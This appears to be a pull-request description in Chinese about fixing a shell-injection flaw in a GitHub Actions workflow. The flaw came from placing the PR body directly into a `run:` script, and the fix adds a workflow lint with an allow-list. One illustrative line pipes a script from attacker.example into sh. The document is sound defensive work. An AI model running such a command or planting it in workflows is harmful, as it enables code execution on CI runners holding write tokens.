## Motivation

`CHG-20260810-03`（G7）的 PR #210 全綠合併。翻它的 `gate` job log 時，
**G2 步驟**裡有一整排這種東西：

```
line 39: Proposed: command not found
line 39: scripts/status_check.py: Permission denied
line 39: session_start.py: command not found
line 39: 已驗收/已收尾/accepted/closed: No such file or directory
line 39: tests/e1/test_backend_guard.py: Permission denied
```

那些字串全部來自**該 PR 內文裡的 markdown 行內程式碼**。G2 只是要檢查內文有沒有
`CHG-` 字樣，卻把整份內文當成 shell 腳本執行了一遍。

### 為什麼會這樣

```yaml
run: |
  echo "${{ github.event.pull_request.body }}" | grep -qE 'CHG-[0-9]{8}-'
```

**`${{ }}` 不是 shell 變數。** 它是 GitHub Actions 在把腳本交給 shell **之前**做的
字串替換：runner 先把 PR 內文原封不動貼進腳本檔，才啟動 bash。於是內文裡的反引號
與 `$(...)` 對 bash 而言是命令替換語法，不是資料。

雙引號救不了——`"..."` 內部的反引號與 `$()` 照樣求值。**引號只擋斷字，不擋求值。**

### 這次的後果與真正的風險

這次是良性的：那些「指令」不存在或沒有執行權限，全部失敗。
但同一條路徑上寫 `$(curl attacker.example/x.sh | sh)`，就會在一台帶著
`contents: write` + `pull-requests: write` 的 GITHUB_TOKEN 的 runner 上執行。
**任何能在本 repo 開 PR 的人都做得到，不需要額外權限。**

### 最值得記住的一點

**那次執行是綠燈。** 注入的指令全部失敗，但 `grep` 成功了，步驟就通過了。
只看 exit code 永遠看不到這個缺陷——它是被一份剛好含 markdown 行內程式碼的 PR 內文
撞出來的，不是被任何測試測出來的。

這與 [[K-003]] 同型：**守衛自己有洞，而洞不會讓任何測試變紅。**
差別是 K-003 的防線只是空轉，這一條的防線本身變成了攻擊面。

### 修改步驟

1. **G2 改走 `env:`**：`PR_BODY: ${{ … }}` + `printf '%s' "$PR_BODY" | grep -qE …`。
   用 `printf '%s'` 而非 `echo`——`echo` 對 `-n`／`-e` 開頭的內容行為依實作而異。
2. **同類三處一併修**：`origin/${{ github.base_ref }}`（G1 / G7 / G4）改走 `BASE_REF` env。
   **git 允許分支名含 `$`、`(`、`)`、反引號**，ref 名內插是同一個注入面，只是門檻較高。
3. **`${{ steps.unit.outputs.risk }}`**（HALT 留言）改走 `RISK` env。此處值由 `plan.py`
   產生、不是事件酬載，屬防禦性收斂，非已知漏洞。
4. **新增 G8 `scripts/workflow_lint.py`**，排在**所有閘門最前面**：它守的是這個
   workflow 自己，本檔若已可被注入，後面每一道閘門的判定都不再可信——
   先確認裁判沒被買通，再開始比賽。
5. G7 的自我測試由逐檔點名改為 `unittest discover -s tests/gates`：
   新增一支閘門測試不該還要記得回來改 workflow。
6. 收錄 K-008；`AGENTS.md` 補硬規則（讓下一個寫 workflow 的人在讀規則時就看到）。

### 判定採允許清單，不是黑名單（代使用者決定，供覆核）

黑名單擋不完：今天擋 `body`，明天有人用 `title`、`head_ref`、issue comment 的內文。
所以反過來——**`run:` 裡出現的 `${{ }}` 一律違規**，除非在允許清單上。
清單只放結構上不可能挾帶 shell 元字元者：整數（PR 編號、run id）、commit SHA、
repo 全名、`steps.*.outputs.*`（值由本 repo 的腳本產生，不是事件酬載）。

豁免機制：`# workflow-lint: allow <理由>`。兩條約束——
- **理由不可空白**（空白的豁免等於沒有簽名）；
- **必須貼在違規行本身或其上一行**。放寬到整個步驟的話，一句理由會替它底下
  所有內插背書，包括日後才加進來、沒人審過的那幾行。

### 為什麼不改用 `pull_request_target` 或收緊 token 權限

不需要。本 workflow 用的是 `pull_request`（fork PR 拿到唯讀 token），
問題不在權限模型而在字串處理；`contents: write` 是自動合併真正需要的。
把權限拿掉會弄壞自動合併，而注入面還在。**修有洞的那一行，不要動沒壞的那一層。**

## 不含（避免越界）

- 不把 `tests/e1/test_backend_guard.py` 接上 CI（`CHG-20260810-03` 已記為未涵蓋，

### 3. 閘門測試（30 條全過，含 G7 既有 17 條）

```bash
python3 -m unittest discover -s tests/gates -p 'test_*.py'
```


`skipped=1` 是 G7 的全庫掃描（預設關閉，需 `G7_FULL_SCAN=1`），非失敗。

G8 的 13 條涵蓋：紅燈 5 條（PR body / PR title / head_ref / 單行 `run:` 形式 /
掃到 0 個檔）、綠燈 4 條（env 間接 / 允許清單 / **`env:` 區塊內的 `${{ }}` 不得被
自己的閘門擋下** / `steps.*.outputs.*`）、豁免 3 條（有理由過、空理由紅、
貼太遠不算數）、真實 repo workflow 1 條。

### 4. 寫測試時抓到的兩個自己的 bug

- `lint(files={})` 用 `files or {...}` 判斷——空 dict 是 falsy，
  「掃 0 個檔」那條測試會偷偷變成掃一個內容為 `None` 的檔。改 `files is not None`。
- 豁免註解原本只在「違規行或上一行」找，但測試把它貼在 `run:` 開頭（相隔兩行以上）
  卻預期通過。**是測試寫錯，不是實作寫錯**——反而確認了範圍應該窄，
  於是補一條 `test_allow_on_a_distant_line_does_not_cover` 把這個行為釘住。

### 5. 未涵蓋（明確記錄）

- **G8 在真實 PR 上的行為**由本 PR 自身首次實測。
- lint 以縮排判斷 `run:` 區塊範圍，非 YAML 解析（解析後拿不到行號，
  而閘門訊息沒有行號就沒人修得動）。極端縮排寫法可能誤判——目前 1 個 workflow 檔已驗證。
